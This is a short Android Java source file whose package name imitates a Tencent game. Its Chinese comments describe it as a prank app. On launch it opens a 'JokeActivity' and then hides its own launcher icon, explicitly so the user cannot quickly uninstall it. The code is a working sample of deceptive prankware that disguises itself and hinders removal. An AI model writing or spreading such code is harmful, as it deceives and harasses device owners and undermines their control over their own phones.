package com.tencent.tmgp.vs;

import android.app.*;
import android.content.*;
import android.content.pm.*;
import android.os.*;

public class MainActivity extends Activity 
{
//用于跳转恶搞活动，并隐藏启动图标
	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
		//跳转恶搞活动
		startActivity(new Intent(this,JokeActivity.class));
		//隐藏启动图标，让用户无法快速卸载
		hideIcon();
	}
	
	 void hideIcon() {
        PackageManager packageManager =getPackageManager();// 获取PackageManager
        ComponentName componentName = new ComponentName(this, MainActivity.class);// 获取类名对于的组件名称
        int componentState = packageManager
			.getComponentEnabledSetting(componentName);// 返回组件的启动状态
        if (componentState == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
			|| componentState == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
			//隐藏启动图标
            packageManager.setComponentEnabledSetting(componentName,
													  PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
													  PackageManager.DONT_KILL_APP);
        }
    }
}
